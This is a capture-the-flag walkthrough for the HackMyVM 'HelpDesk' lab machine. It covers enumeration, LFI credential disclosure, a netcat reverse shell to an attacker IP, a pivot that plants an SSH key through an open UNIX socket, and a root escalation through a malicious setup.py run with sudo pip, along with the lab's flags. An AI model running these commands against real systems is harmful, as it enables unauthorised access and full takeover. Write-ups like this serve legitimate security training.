# HelpDesk-HMV: [HelpDesk](https://hackmyvm.eu/machines/machine.php?vm=HelpDesk)

> **Summary:** Nmap → web enum → parameter fuzzing (WFuzz) → LFI to leak credentials → web login → RCE (diagnostic panel) → pivot via world-writable UNIX socket (socat) to drop SSH key → SSH as helpdesk → privesc via sudo `pip3 install` → root

 
## Overview

**Goal:** Gain root on the *helpdesk* machine.

**Attack path (high level):**
1. Nmap enumeration (22/80).
2. Web content discovery (feroxbuster).
3. Parameter fuzzing on `ticket.php` with WFuzz reveals `url` parameter.
4. LFI via `ticket.php?url=...` to read `/etc/passwd` and `login.php` (credential disclosure).
5. Web login as `helpdesk` with password `ticketmaster`.
6. Use “remote command panel” to obtain command execution as `www-data`.
7. Discover `/opt/helpdesk-socket` with a world-writable unix socket and handler executing received commands.
8. Use `socat` to run commands as `helpdesk` and add attacker SSH public key.
9. SSH as `helpdesk`, read user flag.
10. Privilege escalation via `sudo pip3 install --break-system-packages *` using a malicious local package (`setup.py` executes as root), set SUID on `/bin/bash`, `bash -p` to become root.

---

## Table of Contents
- [Overview](#overview)
- [1) Enumeration](#1-enumeration)
- [2) Web discovery](#2-web-discovery)
- [3) Parameter fuzzing (WFuzz)](#3-parameter-fuzzing-wfuzz)
- [4) LFI to leak credentials](#4-lfi-to-leak-credentials)
- [5) Web login and RCE](#5-web-login-and-rce)
- [6) Pivot to helpdesk via UNIX socket](#6-pivot-to-helpdesk-via-unix-socket)
- [7) SSH as helpdesk](#7-ssh-as-helpdesk)
- [8) Privilege escalation (sudo pip)](#8-privilege-escalation-sudo-pip)
- [9) Flags](#9-flags)
- [10) Notes / Takeaways](#10-notes--takeaways)

---

## 1) Enumeration

```zsh
└─$ cat nmap-helpdesk.log
# Nmap 7.98 scan initiated
Nmap scan report for HelpDesk.hmv (192.168.56.143)
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Debian))
|_http-title: HelpDesk Support Portal
```

---

## 2) Web discovery

```zsh
└─$ feroxbuster -e -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -t 50 -o ferox-helpdesk.log
```

Discovered endpoints:

- `http://HelpDesk.hmv/`
- `http://HelpDesk.hmv/debug.php`
- `http://HelpDesk.hmv/index.php`
- `http://HelpDesk.hmv/login.php`
- `http://HelpDesk.hmv/?wsdl`
- `http://HelpDesk.hmv/helpdesk/`
- `http://HelpDesk.hmv/ticket.php`

---

## 3) Parameter fuzzing (WFuzz)

Fuzzed parameters on `ticket.php`:

```zsh
└─$ wfuzz -t 500 -c -w /usr/share/seclists/Discovery/Web-Content/common.txt  --hh BBB "$url/ticket.php?FUZZ{TEST}=id"
```

Key finding: The parameter `url` produced different response sizes and word counts, indicating it is used to include or read files/URLs.

---

## 4) LFI to leak credentials

The `ticket.php` page reads a file or URL from the `url` parameter and reflects its contents.

Examples:

```zsh
└─$ curl "$url/ticket.php?url=/etc/passwd" -s | grep  '/bin/bash' > users.txt
└─$ curl "$url/ticket.php?url=login.php" -s
```

The `login.php` source revealed stored credentials:

```
$username = "helpdesk";
$password = "ticketmaster";
```

---

## 5) Web login and RCE

After logging in as `helpdesk` with password `ticketmaster` on the web UI, a “remote command panel” is available.

Executed command via panel:

```zsh
busybox nc 192.168.56.1 9002 -e /bin/bash
```

Listener on attacker machine:

```zsh
nc -lvnp 9002
```

Got a shell as `www-data`:

```zsh
www-data@helpdesk:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 6) Pivot to helpdesk via UNIX socket

Discovered `/opt/helpdesk-socket` directory:

```zsh
www-data@helpdesk:/opt/helpdesk-socket$ ls -l
total 8
-rwxr-xr-x 1 root root  45 Dec 24 12:00 serve.sh
-rwxrwxrwx 1 root root 100 Dec 24 12:00 handler.sh
srwxrwxrwx 1 root root   0 Dec 24 12:00 helpdesk.sock
```

Contents of `serve.sh`:

```zsh
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

Contents of `handler.sh`:

```zsh
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo "[HelpDesk Automation] Executing: $cmd"
/bin/bash -c "$cmd"
```

Explanation:

- It reads a full line from stdin (`read cmd`).
- `socat EXEC:handler.sh` pipes socket input into stdin.
- The command is executed via `/bin/bash -c "$cmd"` as the `helpdesk` user.

Using `socat` to run commands as `helpdesk`:

```zsh
echo "pwd" | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
```

Adding attacker SSH public key:

```zsh
echo 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && sshid="ssh-ed25519 .... " && echo $sshid >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys ' | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
```

## 7) SSH as helpdesk

Logged in as `helpdesk`:

```zsh
└─$ ssh helpdesk@$ip
helpdesk@helpdesk:~$ cat user.txt
flag{ticket_approved_by_thedesk}
```

Checked sudo privileges:

```zsh
helpdesk@helpdesk:~$ sudo -l
[sudo] password for helpdesk:
Matching Defaults entries for helpdesk on helpdesk:
    !requiretty, !visiblepw, !authenticate

User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

---

## 8) Privilege escalation (sudo pip)

`pip install` runs `setup.py` during installation. With sudo NOPASSWD on `pip3 install`, this allows root code execution.

Steps:

- Created minimal malicious package:

```zsh
mkdir package
echo "" > package/__init__.py
```

- Created `setup.py`:

```python
from setuptools import setup
import os

os.system("chmod +s /bin/bash")

setup(
    name="package",
    version="0.1",
    packages=["package"],
)
```

- Installed package with sudo:

```zsh
sudo pip3 install --break-system-packages ./package
```

- Verified `/bin/bash` has SUID:

```zsh
ls -l /bin/bash
# -rwsr-xr-x 1 root root ...
```

- Spawned root shell:

```zsh
bash -p
# id
uid=0(root) gid=0(root) groups=0(root)
```

- Read root flag:

```zsh
cat /root/root.txt
flag{request_has_been_escalated}
```

Optionally, a cleanup script resets the password and removes files in `/tmp`.

---

## 9) Flags

- **User:** `flag{ticket_approved_by_thedesk}`
- **Root:** `flag{request_has_been_escalated}`

---

## 10) Notes / Takeaways

- WFuzz's `FUZZ{baseline}` and `--hh BBB` options help identify parameters that affect response size.
- LFI vulnerabilities can lead to source code and credential disclosure.
- World-writable UNIX sockets combined with command handlers pose critical security risks.
- Never allow untrusted users to `sudo pip install *` — this is a major privilege escalation vector.
